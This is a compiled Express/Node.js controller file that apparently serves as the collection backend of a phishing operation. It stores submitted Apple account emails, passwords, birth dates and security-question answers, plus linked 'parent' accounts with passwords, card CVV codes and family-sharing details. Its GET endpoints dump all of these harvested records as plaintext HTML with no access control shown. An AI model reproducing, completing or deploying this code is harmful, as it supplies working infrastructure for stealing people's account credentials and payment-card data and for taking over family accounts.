"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getAccountsWithParent = exports.getErrors = exports.getParentsUrl = exports.getParentsCvv = exports.getUnknowns = exports.getAccounts = exports.addAccountWithParent = exports.addError = exports.addParent = exports.addUnknown = exports.addAccount = void 0;
const unknownModel_1 = __importDefault(require("../models/unknownModel"));
const appleAccountModel_1 = __importDefault(require("../models/appleAccountModel"));
const accountWithParentModel_1 = __importDefault(require("../models/accountWithParentModel"));
const parentModel_1 = __importDefault(require("../models/parentModel"));
const errorModel_1 = __importDefault(require("../models/errorModel"));
const addAccount = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        const existingAccount = yield appleAccountModel_1.default.findOne({
            email: account.email,
        });
        if (existingAccount) {
            res.status(201).send("Account already exists");
            return;
        }
        yield appleAccountModel_1.default.create(account);
        res.status(201).send("Account added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addAccount = addAccount;
const addUnknown = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield unknownModel_1.default.create(account);
        res.status(201).send("Unknown added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addUnknown = addUnknown;
const addParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const parent = req.body;
        if (Object.keys(parent).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        const existingParent = yield parentModel_1.default.findOne({ email: parent.email });
        if (existingParent) {
            res.status(201).send("Parent already exists");
            return;
        }
        yield parentModel_1.default.create(parent);
        res.status(201).send("Parent added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the parent");
    }
});
exports.addParent = addParent;
const addError = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const parent = req.body;
        if (Object.keys(parent).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield errorModel_1.default.create(parent);
        res.status(201).send("Error added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the error");
    }
});
exports.addError = addError;
const addAccountWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield accountWithParentModel_1.default.create(account);
        res.status(201).send("Account added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addAccountWithParent = addAccountWithParent;
const getAccounts = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield appleAccountModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q }) => `${email},${password},${date},${first_q},${second_q},${third_q}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the accounts");
    }
});
exports.getAccounts = getAccounts;
const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield unknownModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, url, }) => cvv
            ? `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
            : `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${url}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the unknowns");
    }
});
exports.getUnknowns = getUnknowns;
const getParentsCvv = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const parents = yield parentModel_1.default.find();
        const parentText = parents
            .filter((parent) => parent.cvv)
            .map(({ email, password, date, first_q, second_q, third_q, cvv, no2, url2, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${no2},${url2},${stop_sharing},${no_of_family}`)
            .join("<br />");
        res.status(200).send(`<p>${parentText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the parents");
    }
});
exports.getParentsCvv = getParentsCvv;
const getParentsUrl = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const parents = yield parentModel_1.default.find();
        const parentText = parents
            .filter((parent) => parent.url)
            .map(({ email, password, date, first_q, second_q, third_q, no, url, no2, url2, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${no2},${url2},${stop_sharing},${no_of_family}`)
            .join("<br />");
        res.status(200).send(`<p>${parentText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the parents");
    }
});
exports.getParentsUrl = getParentsUrl;
const getErrors = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const parents = yield errorModel_1.default.find();
        const parentText = parents
            .map(({ email, password, date, first_q, second_q, third_q, cvv, no, url, stop_sharing, no_of_family, }) => cvv
            ? `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
            : `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`)
            .join("<br />");
        res.status(200).send(`<p>${parentText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the errors");
    }
});
exports.getErrors = getErrors;
const getAccountsWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield accountWithParentModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res
            .status(500)
            .send("Something went wrong getting the accounts with parent");
    }
});
exports.getAccountsWithParent = getAccountsWithParent;
